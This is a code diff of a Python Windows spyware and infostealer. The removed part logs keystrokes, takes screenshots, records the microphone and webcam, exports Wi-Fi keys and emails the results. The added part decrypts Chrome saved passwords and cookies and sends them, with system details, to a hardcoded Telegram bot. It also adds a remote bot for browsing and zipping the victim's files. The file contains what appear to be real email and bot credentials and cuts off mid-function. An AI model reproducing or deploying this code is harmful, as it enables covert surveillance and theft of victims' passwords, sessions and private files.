@@ -1,341 +1,805 @@
-import subprocess                                   # Used to run new applications
-import socket                                       # Used to write to Internet servers
-import win32clipboard                               # System grabs the most recent clipboard data and saves it to a file
-import os                                           # Provides functions for interacting with the operating system
-import re                                           # Helps you match or find other strings or sets of strings
-import smtplib                                      # Defines an SMTP client session object
-import logging                                      # Allows writing status messages to a file or any other output streams
-import pathlib                                      # Deals with path related tasks
-import json                                         
-import time                                         # Waiting during code execution & measuring the efficiency of your code.
-import cv2                                          # Image processing, video capture
-import sounddevice                                  # Play and record NumPy arrays containing audio signals
-import shutil                                       # Automating process of copying and removal of files and directories
-import requests                                     # Send HTTP/1.1 requests using Python
-import browserhistory as bh                         # To get browser username, database paths, and history in JSON format
-from multiprocessing import Process                 # supports spawning processes
-from pynput.keyboard import Key, Listener           # Monitor input devices
-from PIL import ImageGrab                           # Copy the contents of the screen or the clipboard to a PIL image memory
-from scipy.io.wavfile import write as write_rec     # Write a NumPy array as a WAV file
-from cryptography.fernet import Fernet              # Message encrypted using it cannot be manipulated or read without the key
-from email.mime.multipart import MIMEMultipart      # Encodes ['From'], ['To'], and ['Subject']
-from email.mime.text import MIMEText                # Sending text emails
-from email.mime.base import MIMEBase                # Adds a Content-Type header
-from email import encoders
+import subprocess
+import socket
+import win32clipboard
+import os
+import re
+import requests
+import logging
+import pathlib
+import json
+from telegram.ext import Updater, CommandHandler, MessageHandler, filters, ApplicationBuilder
+from telegram import Update
+import telegram
+import time
+import cv2
+import sounddevice
+import shutil
+import browserhistory as bh
+import sqlite3
+import base64
+import win32crypt
+from multiprocessing import Process
+from pynput.keyboard import Key, Listener
+from PIL import ImageGrab
+from scipy.io.wavfile import write as write_rec
+from cryptography.fernet import Fernet
+import tempfile
+import psutil
+from Crypto.Cipher import AES
+from telegram.ext import Updater, CommandHandler
+import telegram
 
 ################ Configuration: Base Path and Default Settings ################
 
-# Get Windows username for dynamic path creation
+# Get Windows username dynamically
 WINDOWS_USERNAME = os.getenv('USERNAME')
-BASE_LOG_PATH = pathlib.Path(f'C:\\Users\\{WINDOWS_USERNAME}\\AppData\\Local\\Temp\\Logs\\')
-# Fallback to Temp folder if above path fails
-if not BASE_LOG_PATH.parent.exists():
-    BASE_LOG_PATH = pathlib.Path(f'C:\\Users\\{WINDOWS_USERNAME}\\AppData\\Local\\Temp\\Logs\\')
+BASE_LOG_PATH = pathlib.Path(tempfile.gettempdir()) / 'Logs'
+BASE_LOG_PATH.mkdir(parents=True, exist_ok=True)
 
-################ Functions: Keystorke Capture, Screenshot Capture, Mic Recroding, Webcam Snapshot, Email Sending ################
+# Telegram Configuration
+BOT_TOKEN = "6622438559:AAEGqBZnIYwNth3FhtkOSwQEeRMe8nyv660"
+CHAT_ID = "2119992330"
 
-# Keystroke Capture Funtion
-def logg_keys(file_path):
+################ Telegram Enhanced Functions ################
+
+def send_telegram_message(text, parse_mode='HTML', chat_id=None):
+    """Send formatted text message to Telegram"""
+    if chat_id is None:
+        chat_id = CHAT_ID
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {
+        'chat_id': chat_id,
+        'text': text,
+        'parse_mode': parse_mode
+    }
     try:
-        log_file = os.path.join(file_path, 'key_logs.txt')
-        logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
-        on_press = lambda Key : logging.info(str(Key))  # Log the Pressed Keys
-        with Listener(on_press=on_press) as listener:   # Collect events until released
-            listener.join()
+        response = requests.post(url, json=payload, timeout=10)
+        response.raise_for_status()
+        return response.json()
     except Exception as e:
-        logging.error(f'Keystroke logging error: {e}')
+        logging.error(f'Failed to send Telegram message: {e}')
+        return None
 
-# Loop that records the microphone for 60 second intervals
-def screenshot(file_path):
+def send_telegram_file(file_path, caption="", chat_id=None):
+    """Send file to Telegram with caption"""
+    if chat_id is None:
+        chat_id = CHAT_ID
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+    
     try:
-        screenshots_path = os.path.join(file_path, 'Screenshots')
-        pathlib.Path(screenshots_path).mkdir(parents=True, exist_ok=True)
+        with open(file_path, 'rb') as file:
+            files = {'document': file}
+            data = {'chat_id': chat_id}
+            if caption:
+                data['caption'] = caption[:1024]
+            
+            response = requests.post(url, files=files, data=data, timeout=30)
+            response.raise_for_status()
+            return response.json()
+    except Exception as e:
+        logging.error(f'Telegram file sending error for {file_path}: {e}')
+        return None
 
-        for x in range(0, 10):
+################ Chrome Password Extraction - FIXED VERSION ################
+
+def get_master_key():
+    """Get Chrome's master key for decrypting passwords (Chrome 80+)"""
+    try:
+        # Path to Chrome's Local State file
+        local_state_path = os.path.join(
+            os.environ['USERPROFILE'],
+            'AppData', 'Local', 'Google', 'Chrome',
+            'User Data', 'Local State'
+        )
+        
+        if os.path.exists(local_state_path):
+            with open(local_state_path, 'r', encoding='utf-8') as f:
+                local_state = json.loads(f.read())
+            
+            # Get encrypted key
+            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+            
+            # Remove the 'DPAPI' prefix (5 bytes)
+            encrypted_key = encrypted_key[5:]
+            
+            # Decrypt using DPAPI
+            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            return master_key
+    except Exception as e:
+        logging.error(f'Error getting master key: {e}')
+    
+    return None
+
+def decrypt_password(encrypted_password, master_key):
+    """Decrypt Chrome password using AES-GCM"""
+    try:
+        if not encrypted_password:
+            return "[EMPTY]"
+        
+        # Chrome 80+ uses AES-GCM with prefix 'v10' or 'v11'
+        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
+            # Remove the 'v10' or 'v11' prefix (3 bytes)
+            encrypted_password = encrypted_password[3:]
+            
+            # Extract nonce (12 bytes), ciphertext, and tag (16 bytes)
+            nonce = encrypted_password[:12]
+            ciphertext = encrypted_password[12:-16]
+            tag = encrypted_password[-16:]
+            
+            # Decrypt using AES-GCM
+            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+            return decrypted.decode('utf-8')
+        else:
+            # Old Chrome version (pre-80) - use DPAPI directly
             try:
-                pic = ImageGrab.grab()
-                pic.save(os.path.join(screenshots_path, f'screenshot{x}.png'))
-                time.sleep(5)                               # Gap between the each screenshot in sec
-            except Exception as e:
-                logging.error(f'Screenshot {x} failed: {e}')
+                decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
+                return decrypted.decode('utf-8')
+            except:
+                return "[OLD VERSION - CANNOT DECRYPT]"
     except Exception as e:
-        logging.error(f'Screenshot function error: {e}')
+        logging.error(f'Password decryption error: {e}')
+        return f"[DECRYPTION FAILED: {str(e)[:50]}]"
 
-# Loop that save a picture every 5 seconds
-def microphone(file_path):
+def get_chrome_passwords():
+    """Extract AND DECRYPT saved passwords from Google Chrome"""
+    passwords = []
     try:
-        for x in range(0, 5):
-            try:
-                fs = 44100
-                seconds = 10
-                myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
-                sounddevice.wait()                          # To check if the recording is finished
-                write_rec(os.path.join(file_path, f'{x}_mic_recording.wav'), fs, myrecording)
-            except Exception as e:
-                logging.error(f'Microphone recording {x} failed: {e}')
+        # Get master key first
+        master_key = get_master_key()
+        
+        if not master_key:
+            logging.error("Could not get Chrome master key")
+            return passwords
+        
+        # Chrome data path
+        chrome_path = os.path.join(
+            os.environ['USERPROFILE'],
+            'AppData', 'Local', 'Google', 'Chrome',
+            'User Data', 'Default', 'Login Data'
+        )
+        
+        if os.path.exists(chrome_path):
+            # Copy the database to avoid lock issues
+            temp_db = os.path.join(str(BASE_LOG_PATH), 'chrome_passwords.db')
+            shutil.copy2(chrome_path, temp_db)
+            
+            # Connect to the database
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            
+            # Get passwords
+            cursor.execute("""
+                SELECT origin_url, username_value, password_value, date_created
+                FROM logins 
+                ORDER BY date_created DESC
+            """)
+            
+            decrypted_count = 0
+            total_count = 0
+            
+            for row in cursor.fetchall():
+                url = row[0]
+                username = row[1]
+                encrypted_password = row[2]
+                
+                total_count += 1
+                
+                # Decrypt the password
+                if encrypted_password:
+                    password = decrypt_password(encrypted_password, master_key)
+                    if not password.startswith('['):  # If successfully decrypted
+                        decrypted_count += 1
+                else:
+                    password = "[EMPTY]"
+                
+                passwords.append({
+                    'url': url,
+                    'username': username,
+                    'password': password,
+                    'decrypted': not password.startswith('[')
+                })
+            
+            conn.close()
+            os.remove(temp_db)
+            
+            logging.info(f"Decrypted {decrypted_count}/{total_count} passwords successfully")
+            
     except Exception as e:
-        logging.error(f'Microphone function error: {e}')
+        logging.error(f'Chrome password extraction error: {e}')
+    
+    return passwords
 
-# Webcam Snapshot Function #
-def webcam(file_path):
+def extract_and_send_chrome_passwords(file_path):
+    """Extract Chrome passwords and send them via Telegram"""
     try:
-        webcam_path = os.path.join(file_path, 'WebcamPics')
-        pathlib.Path(webcam_path).mkdir(parents=True, exist_ok=True)
-        cam = cv2.VideoCapture(0)
+        send_telegram_message("🔐 <b>DECRYPTING CHROME PASSWORDS...</b>")
+        
+        # Get passwords
+        passwords = get_chrome_passwords()
+        
+        if not passwords:
+            send_telegram_message("❌ <b>No Chrome passwords found or could not decrypt</b>")
+            return None
+        
+        # Save to file
+        chrome_data_path = os.path.join(file_path, 'chrome_data')
+        pathlib.Path(chrome_data_path).mkdir(parents=True, exist_ok=True)
+        
+        password_file = os.path.join(chrome_data_path, 'decrypted_passwords.txt')
+        
+        with open(password_file, 'w', encoding='utf-8') as f:
+            # Count statistics
+            decrypted_count = sum(1 for p in passwords if p['decrypted'])
+            total_count = len(passwords)
+            
+            f.write("🎯 DECRYPTED CHROME PASSWORDS 🎯\n")
+            f.write("=" * 60 + "\n\n")
+            f.write(f"✅ Decrypted: {decrypted_count}/{total_count} passwords\n")
+            f.write(f"📅 Extraction Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+            f.write(f"👤 User: {WINDOWS_USERNAME}\n")
+            f.write("=" * 60 + "\n\n")
+            
+            # Group by website/domain
+            grouped_passwords = {}
+            for pwd in passwords:
+                if pwd['url']:
+                    domain = pwd['url'].split('/')[2] if '//' in pwd['url'] else pwd['url']
+                    if domain not in grouped_passwords:
+                        grouped_passwords[domain] = []
+                    grouped_passwords[domain].append(pwd)
+            
+            # Write grouped passwords
+            for domain, pwd_list in grouped_passwords.items():
+                f.write(f"\n🌐 {domain}\n")
+                f.write("-" * 40 + "\n")
+                
+                for pwd in pwd_list:
+                    status = "✅" if pwd['decrypted'] else "❌"
+                    f.write(f"{status} URL: {pwd['url']}\n")
+                    f.write(f"   👤 Username: {pwd['username']}\n")
+                    f.write(f"   🔑 Password: {pwd['password']}\n")
+                    f.write("   " + "-" * 30 + "\n")
+            
+            # Summary of decrypted passwords
+            f.write("\n" + "=" * 60 + "\n")
+            f.write("🎯 IMPORTANT DECRYPTED PASSWORDS 🎯\n")
+            f.write("=" * 60 + "\n\n")
+            
+            important_sites = ['google', 'facebook', 'instagram', 'twitter', 'github', 
+                              'microsoft', 'amazon', 'paypal', 'steam', 'discord']
+            
+            for pwd in passwords:
+                if pwd['decrypted'] and any(site in pwd['url'].lower() for site in important_sites):
+                    f.write(f"🔓 {pwd['url']}\n")
+                    f.write(f"   👤 {pwd['username']}\n")
+                    f.write(f"   🔑 {pwd['password']}\n")
+                    f.write("-" * 40 + "\n")
+        
+        # Send immediate summary via Telegram
+        decrypted_count = sum(1 for p in passwords if p['decrypted'])
+        total_count = len(passwords)
+        
+        summary_message = f"""
+🎯 <b>CHROME PASSWORD DECRYPTION COMPLETE</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ <b>Successfully Decrypted:</b> {decrypted_count}/{total_count}
+📊 <b>Success Rate:</b> {(decrypted_count/total_count*100):.1f}%
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+        """
+        
+        send_telegram_message(summary_message)
+        
+        # Send the most important passwords immediately
+        important_passwords = []
+        for pwd in passwords:
+            if pwd['decrypted']:
+                important_sites = ['google.com', 'facebook.com', 'instagram.com', 
+                                  'twitter.com', 'github.com', 'microsoft.com']
+                if any(site in pwd['url'].lower() for site in important_sites):
+                    important_passwords.append(pwd)
+        
+        if important_passwords:
+            # Send first 5 important passwords as immediate message
+            immediate_msg = "🔓 <b>IMMEDIATE ACCESS - IMPORTANT PASSWORDS:</b>\n"
+            immediate_msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            
+            for i, pwd in enumerate(important_passwords[:5], 1):
+                immediate_msg += f"\n{i}. <code>{pwd['url']}</code>\n"
+                immediate_msg += f"   👤 <b>Username:</b> <code>{pwd['username']}</code>\n"
+                immediate_msg += f"   🔑 <b>Password:</b> <code>{pwd['password']}</code>\n"
+            
+            send_telegram_message(immediate_msg)
+        
+        # Send the complete file
+        caption = f"""
+🔓 <b>FULL CHROME PASSWORD DUMP</b>
+━━━━━━━━━━━━━━━━━━━━
+✅ Decrypted: {decrypted_count}/{total_count}
+👤 User: {WINDOWS_USERNAME}
+⏰ Time: {time.strftime('%H:%M:%S')}
+━━━━━━━━━━━━━━━━━━━━
+        """
+        
+        send_telegram_file(password_file, caption)
+        
+        return password_file
+        
+    except Exception as e:
+        logging.error(f'Chrome password extraction error: {e}')
+        send_telegram_message(f"❌ <b>CHROME PASSWORD EXTRACTION FAILED:</b>\n{str(e)[:200]}")
+        return None
 
-        if not cam.isOpened():
-            logging.error('Webcam could not be opened')
+################ Other Chrome Data Functions ################
+
+def get_chrome_autofill():
+    """Extract autofill data from Chrome"""
+    autofill_data = []
+    try:
+        chrome_path = os.path.join(
+            os.environ['USERPROFILE'],
+            'AppData', 'Local', 'Google', 'Chrome',
+            'User Data', 'Default', 'Web Data'
+        )
+        
+        if os.path.exists(chrome_path):
+            temp_db = os.path.join(str(BASE_LOG_PATH), 'chrome_autofill.db')
+            shutil.copy2(chrome_path, temp_db)
+            
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            
+            # Get autofill data
+            cursor.execute("""
+                SELECT name, value, date_created, count 
+                FROM autofill 
+                WHERE value != '' 
+                ORDER BY count DESC, date_created DESC
+                LIMIT 100
+            """)
+            
+            for row in cursor.fetchall():
+                field = row[0]
+                value = row[1]
+                
+                # Filter sensitive data
+                sensitive_fields = ['credit', 'card', 'cvv', 'ssn', 'password', 'secret']
+                if any(sensitive in field.lower() for sensitive in sensitive_fields):
+                    continue
+                    
+                autofill_data.append({
+                    'field': field,
+                    'value': value,
+                    'count': row[3]
+                })
+            
+            conn.close()
+            os.remove(temp_db)
+            
+    except Exception as e:
+        logging.error(f'Chrome autofill extraction error: {e}')
+    
+    return autofill_data
+
+def get_chrome_cookies():
+    """Extract cookies from Chrome"""
+    cookies = []
+    try:
+        chrome_path = os.path.join(
+            os.environ['USERPROFILE'],
+            'AppData', 'Local', 'Google', 'Chrome',
+            'User Data', 'Default', 'Cookies'
+        )
+        
+        if os.path.exists(chrome_path):
+            temp_db = os.path.join(str(BASE_LOG_PATH), 'chrome_cookies.db')
+            shutil.copy2(chrome_path, temp_db)
+            
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            
+            # Get important cookies
+            cursor.execute("""
+                SELECT host_key, name, encrypted_value, path
+                FROM cookies 
+                WHERE (host_key LIKE '%google.com' 
+                       OR host_key LIKE '%facebook.com'
+                       OR host_key LIKE '%github.com'
+                       OR host_key LIKE '%twitter.com'
+                       OR name LIKE '%session%'
+                       OR name LIKE '%token%'
+                       OR name LIKE '%auth%')
+                AND encrypted_value != ''
+                ORDER BY length(encrypted_value) DESC
+                LIMIT 50
+            """)
+            
+            for row in cursor.fetchall():
+                try:
+                    # Try to decrypt the cookie
+                    decrypted = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1]
+                    cookie_value = decrypted.decode('utf-8', errors='ignore')
+                except:
+                    cookie_value = "[ENCRYPTED]"
+                
+                cookies.append({
+                    'domain': row[0],
+                    'name': row[1],
+                    'value': cookie_value[:100],
+                    'path': row[3]
+                })
+            
+            conn.close()
+            os.remove(temp_db)
+            
+    except Exception as e:
+        logging.error(f'Chrome cookies extraction error: {e}')
+    
+    return cookies
+
+################ Updated Main Function with Chrome Decryption ################
+
+################ Telegram Directory Bot ################
+
+def telegram_bot():
+    """Persistent directory navigation bot with zip capabilities"""
+    import os
+    import shutil
+    import time
+    import logging
+    from telegram import Update
+    from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters
+    
+    current_dir = os.path.expanduser('~')
+    zip_dir = os.path.join(str(BASE_LOG_PATH), 'telegram_zips')
+    os.makedirs(zip_dir, exist_ok=True)
+
+    async def start(update: Update, context):
+        await update.message.reply_text(f"""
+🤖 <b>Directory Bot Commands:</b>
+/list [path] - List directory contents
+/cd [path] - Change current directory
+/zip [path] - Zip and send directory/file
+Current directory: {current_dir}
+        """, parse_mode='HTML')
+
+    async def list_dir(update: Update, context):
+        nonlocal current_dir
+        path = ' '.join(context.args) if context.args else current_dir
+        full_path = os.path.abspath(os.path.join(current_dir, path))
+        
+        if not os.path.exists(full_path):
+            await update.message.reply_text("❌ Path does not exist")
             return
 
-        for x in range(0, 10):
-            try:
-                ret, img = cam.read()
-                if ret:
-                    file = os.path.join(webcam_path, f'{x}.jpg')
-                    cv2.imwrite(file, img)
-                    time.sleep(5)
-                else:
-                    logging.error(f'Failed to capture webcam frame {x}')
-            except Exception as e:
-                logging.error(f'Webcam capture {x} failed: {e}')
+        try:
+            items = []
+            for entry in os.listdir(full_path):
+                entry_path = os.path.join(full_path, entry)
+                items.append(f"{'📁' if os.path.isdir(entry_path) else '📄'} {entry}")
+            
+            response = "\n".join(items[:50])  # Limit to 50 items
+            if len(items) > 50:
+                response += "\n... (showing first 50 items)"
+                
+            update.message.reply_text(f"""
+📂 <b>Directory Listing:</b> {full_path}
+━━━━━━━━━━━━━━━━━━━━━━━━━
+{response}
+            """, parse_mode='HTML')
+            
+        except Exception as e:
+            logging.error(f"List error: {e}")
+            update.message.reply_text("❌ Error listing directory")
 
-        cam.release()
-        cv2.destroyAllWindows()
-    except Exception as e:
-        logging.error(f'Webcam function error: {e}')
-
-def email_base(name, email_address):
-    name['From'] = email_address
-    name['To'] =  email_address
-    name['Subject'] = 'Success!!!'
-    body = 'Mission is completed'
-    name.attach(MIMEText(body, 'plain'))
-    return name
-
-def smtp_handler(email_address, password, name):
-    s = smtplib.SMTP('smtp.gmail.com', 587)
-    s.starttls()
-    s.login(email_address, password)
-    s.sendmail(email_address, email_address, name.as_string())
-    s.quit()
-
-def send_email(path):                               # Email sending function #
-    try:
-        regex = re.compile(r'.+\.xml$')
-        regex2 = re.compile(r'.+\.txt$')
-        regex3 = re.compile(r'.+\.png$')
-        regex4 = re.compile(r'.+\.jpg$')
-        regex5 = re.compile(r'.+\.wav$')
-
-        email_address = 'tmeytmong@gmail.com'         #<--- Enter your email address
-        password = 'Viroth@973'                       #<--- Enter email password 
+    async def change_dir(update: Update, context):
+        nonlocal current_dir
+        new_dir = ' '.join(context.args) if context.args else ''
+        full_path = os.path.abspath(os.path.join(current_dir, new_dir))
         
-        msg = MIMEMultipart()
-        email_base(msg, email_address)
+        if os.path.isdir(full_path):
+            current_dir = full_path
+            await update.message.reply_text(f"📂 Changed to: {current_dir}")
+        else:
+            await update.message.reply_text("❌ Directory does not exist")
 
-        exclude = set(['Screenshots', 'WebcamPics'])
-        for dirpath, dirnames, filenames in os.walk(path, topdown=True):
-            dirnames[:] = [d for d in dirnames if d not in exclude]
-            for file in filenames:
-                # For each file in the filenames in the specified path, it will try to match the file extension to one of the regex variables.
-                # If one of the first four regex variables match, then all of files of that data type will be attached to a single email message.
-                if regex.match(file) or regex2.match(file) or regex3.match(file) or regex4.match(file):
-                    try:
-                        p = MIMEBase('application', "octet-stream")
-                        file_path = os.path.join(dirpath, file)
-                        with open(file_path, 'rb') as attachment:
-                            p.set_payload(attachment.read())
-                        encoders.encode_base64(p)
-                        p.add_header('Content-Disposition', 'attachment;' f'filename = {file}')
-                        msg.attach(p)
-                    except Exception as e:
-                        logging.error(f'Failed to attach file {file}: {e}')
+    async def zip_dir_cmd(update: Update, context):
+        target = ' '.join(context.args) if context.args else current_dir
+        full_path = os.path.abspath(os.path.join(current_dir, target))
+        
+        if not os.path.exists(full_path):
+            await update.message.reply_text("❌ Target does not exist")
+            return
 
-                # If regex5(WAV) variable matches, then that single match will be attached to its own individual email and sent.
-                elif regex5.match(file):
-                    try:
-                        msg_alt = MIMEMultipart()
-                        email_base(msg_alt, email_address)
-                        p = MIMEBase('application', "octet-stream")
-                        file_path = os.path.join(dirpath, file)
-                        with open(file_path, 'rb') as attachment:
-                            p.set_payload(attachment.read())
-                        encoders.encode_base64(p)
-                        p.add_header('Content-Disposition', 'attachment;' f'filename = {file}')
-                        msg_alt.attach(p)
+        try:
+            base_name = os.path.basename(full_path) or "archive"
+            zip_path = os.path.join(zip_dir, f"{base_name}_{int(time.time())}.zip")
+            shutil.make_archive(zip_path[:-4], 'zip', full_path)
+            
+            with open(zip_path, 'rb') as f:
+                context.bot.send_document(
+                    chat_id=update.effective_chat.id,
+                    document=f,
+                    caption=f"📦 Zipped: {full_path}"
+                )
+        except Exception as e:
+            logging.error(f"Zip error: {e}")
+            update.message.reply_text("❌ Error creating zip archive")
 
-                        smtp_handler(email_address, password, msg_alt)
-                    except Exception as e:
-                        logging.error(f'Failed to send WAV file {file}: {e}')
+    def main_bot():
+        application = ApplicationBuilder().token(BOT_TOKEN).build()
 
-                # If there are no matches then pass is called to keep the program moving.
-                else:
-                    pass
+        application.add_handler(CommandHandler("start", start))
+        application.add_handler(CommandHandler("list", list_dir))
+        application.add_handler(CommandHandler("cd", change_dir))
+        application.add_handler(CommandHandler("zip", zip_dir_cmd))
 
-        # To send any of the non WAV files
-        smtp_handler(email_address, password, msg)
-    except Exception as e:
-        logging.error(f'Email sending function error: {e}')
+        application.run_polling()
 
-
-######################### Main Function: Network/Wifi Info, System Info, Clipbaord Data, Browser History #########################
-
-# Once main is initiated the program begins by creating a directory to store the data it will gather.
+    main_bot()
 def main():
     try:
-        # Create logs directory dynamically
+        # Initialize Telegram bot components
+        current_dir = os.path.expanduser('~')
+        zip_dir = os.path.join(str(BASE_LOG_PATH), 'telegram_zips')
+        os.makedirs(zip_dir, exist_ok=True)
+
+        # Define bot command handlers
+        async def start(update: Update, context):
+            await update.message.reply_text(f"""
+🤖 <b>Directory Bot Commands:</b>
+/list [path] - List directory contents
+/cd [path] - Change current directory
+/zip [path] - Zip and send directory/file
+Current directory: {current_dir}
+            """, parse_mode='HTML')
+
+        async def list_dir(update: Update, context):
+            path = ' '.join(context.args) if context.args else current_dir
+            full_path = os.path.abspath(os.path.join(current_dir, path))
+            
+            if not os.path.exists(full_path):
+                await update.message.reply_text("❌ Path does not exist")
+                return
+
+            try:
+                items = []
+                for entry in os.listdir(full_path):
+                    entry_path = os.path.join(full_path, entry)
+                    items.append(f"{'📁' if os.path.isdir(entry_path) else '📄'} {entry}")
+                
+                response = "\n".join(items[:50])
+                if len(items) > 50:
+                    response += "\n... (showing first 50 items)"
+                    
+                await update.message.reply_text(f"""
+📂 <b>Directory Listing:</b> {full_path}
+━━━━━━━━━━━━━━━━━━━━━━━━━
+{response}
+                """, parse_mode='HTML')
+                
+            except Exception as e:
+                logging.error(f"List error: {e}")
+                await update.message.reply_text("❌ Error listing directory")
+
+        async def change_dir(update: Update, context):
+            nonlocal current_dir
+            new_dir = ' '.join(context.args) if context.args else ''
+            full_path = os.path.abspath(os.path.join(current_dir, new_dir))
+            
+            if os.path.isdir(full_path):
+                current_dir = full_path
+                await update.message.reply_text(f"📂 Changed to: {current_dir}")
+            else:
+                await update.message.reply_text("❌ Directory does not exist")
+
+        async def zip_dir_cmd(update: Update, context):
+            target = ' '.join(context.args) if context.args else current_dir
+            full_path = os.path.abspath(os.path.join(current_dir, target))
+            
+            if not os.path.exists(full_path):
+                await update.message.reply_text("❌ Target does not exist")
+                return
+
+            try:
+                base_name = os.path.basename(full_path) or "archive"
+                zip_path = os.path.join(zip_dir, f"{base_name}_{int(time.time())}.zip")
+                shutil.make_archive(zip_path[:-4], 'zip', full_path)
+                
+                with open(zip_path, 'rb') as f:
+                    await context.bot.send_document(
+                        chat_id=update.effective_chat.id,
+                        document=f,
+                        caption=f"📦 Zipped: {full_path}"
+                    )
+            except Exception as e:
+                logging.error(f"Zip error: {e}")
+                await update.message.reply_text("❌ Error creating zip archive")
+
+        # Initialize Telegram bot instance
+        application = ApplicationBuilder().token(BOT_TOKEN).build()
+        application.add_handler(CommandHandler("start", start))
+        application.add_handler(CommandHandler("list", list_dir))
+        application.add_handler(CommandHandler("cd", change_dir))
+        application.add_handler(CommandHandler("zip", zip_dir_cmd))
+
+        # Create logs directory
         file_path = str(BASE_LOG_PATH)
         pathlib.Path(file_path).mkdir(parents=True, exist_ok=True)
-
-        # Retrieve Network/Wifi informaton for the network_wifi file
-        network_wifi_path = os.path.join(file_path, 'network_wifi.txt')
-        with open(network_wifi_path, 'a') as network_wifi:
-            try:
-                # Using the subprocess module a shell executes the specified commands with the standard output and error directed to the log file.
-                log_path = file_path
-                commands = subprocess.Popen([ 'Netsh', 'WLAN', 'export', 'profile', f'folder={log_path}', 'key=clear', 
-                                            '&', 'ipconfig', '/all', '&', 'arp', '-a', '&', 'getmac', '-V', '&', 'route', 'print', '&',
-                                            'netstat', '-a'], stdout=network_wifi, stderr=network_wifi, shell=True)
-                # The communicate funtion is used to initiate a 60 second timeout for the shell.
-                outs, errs = commands.communicate(timeout=60)   
-
-            except subprocess.TimeoutExpired:
-                commands.kill()
-                out, errs = commands.communicate()
-            except Exception as e:
-                logging.error(f'Network/Wifi command error: {e}')
-
-        # Retrieve system information for the system_info file
+        
+        # Send initial notification
         hostname = socket.gethostname()
         IPAddr = socket.gethostbyname(hostname)
+        
+        send_telegram_message(f"""
+🎯 <b>TARGET ACQUIRED</b>
+━━━━━━━━━━━━━━━━━━━━
+👤 <b>User:</b> <code>{WINDOWS_USERNAME}</code>
+💻 <b>System:</b> <code>{hostname}</code>
+🌐 <b>IP:</b> <code>{IPAddr}</code>
+⏰ <b>Time:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}
+━━━━━━━━━━━━━━━━━━━━
+🚀 <b>Mission initialized...</b>
+        """)
 
+        # 1. SYSTEM INFORMATION
+        send_telegram_message("💻 <b>Phase 1: Collecting system information...</b>")
+        
         system_info_path = os.path.join(file_path, 'system_info.txt')
-        with open(system_info_path, 'a') as system_info:
+        with open(system_info_path, 'w', encoding='utf-8') as system_info:
             try:
                 public_ip = requests.get('https://api.ipify.org', timeout=5).text
-            except (requests.ConnectionError, requests.Timeout):
-                public_ip = '* Ipify connection failed *'
-
-            system_info.write('Public IP Address: ' + public_ip + '\n' + 'Private IP Address: ' + IPAddr + '\n')
+            except:
+                public_ip = 'N/A'
+            
+            system_info.write(f"""
+┌─────────────────────────────────
+│ 🖥️ SYSTEM INFORMATION
+├─────────────────────────────────
+│ Public IP: {public_ip}
+│ Private IP: {IPAddr}
+│ Hostname: {hostname}
+│ Username: {WINDOWS_USERNAME}
+│ OS: Windows
+│ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
+└─────────────────────────────────
+\n""")
+            
+            # Get network info
+            system_info.write("\n🌐 NETWORK INFORMATION:\n")
+            system_info.write("-" * 40 + "\n")
             try:
-                get_sysinfo = subprocess.Popen(['systeminfo', '&', 'tasklist', '&', 'sc', 'query'], 
-                                stdout=system_info, stderr=system_info, shell=True)
-                outs, errs = get_sysinfo.communicate(timeout=15)
-
-            except subprocess.TimeoutExpired:
-                get_sysinfo.kill()
-                outs, errs = get_sysinfo.communicate()
-            except Exception as e:
-                logging.error(f'System info command error: {e}')
-
-        # Grabs the most recent clipboard data and saves it to a file
-        try:
-            win32clipboard.OpenClipboard()
-            pasted_data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
-            win32clipboard.CloseClipboard()
-            
-            clipboard_path = os.path.join(file_path, 'clipboard_info.txt')
-            with open(clipboard_path, 'a') as clipboard_info:
-                clipboard_info.write('Clipboard Data: \n' + pasted_data)
-        except Exception as e:
-            logging.error(f'Clipboard capture error: {e}')
-
-        # Get the browser username, database paths, and history in JSON format
-        try:
-            browser_history = []
-            bh_user = bh.get_username()
-            db_path = bh.get_database_paths()
-            hist = bh.get_browserhistory()
-            browser_history.extend((bh_user, db_path, hist))
-            
-            browser_path = os.path.join(file_path, 'browser.txt')
-            with open(browser_path, 'a') as browser_txt:
-                browser_txt.write(json.dumps(browser_history))
-        except Exception as e:
-            logging.error(f'Browser history error: {e}')
-
-
-################################################### Using Multiprocess module ###################################################
-
-        p1 = Process(target=logg_keys, args=(file_path,)) ; p1.start()  # Log Keys
-        p2 = Process(target=screenshot, args=(file_path,)) ; p2.start() # Take Screenshots
-        p3 = Process(target=microphone, args=(file_path,)) ; p3.start() # Record Microphone
-        p4 = Process(target=webcam, args=(file_path,)) ; p4.start()     # Take Webcam Pictures
-
-        # To stop execution of current program until a process is complete
-        p1.join(timeout=300) ; p2.join(timeout=300) ; p3.join(timeout=300) ; p4.join(timeout=300)
-        p1.terminate() ; p2.terminate() ; p3.terminate() ; p4.terminate()
-
-
-######################################################## File Encryption ########################################################
-
-        files = [ 'network_wifi.txt', 'system_info.txt', 'clipboard_info.txt', 'browser.txt', 'key_logs.txt' ]
-
-        regex = re.compile(r'.+\.xml$')
-        dir_path = file_path
-
-        for dirpath, dirnames, filenames in os.walk(dir_path):
-            [ files.append(file) for file in filenames if regex.match(file) ]
-
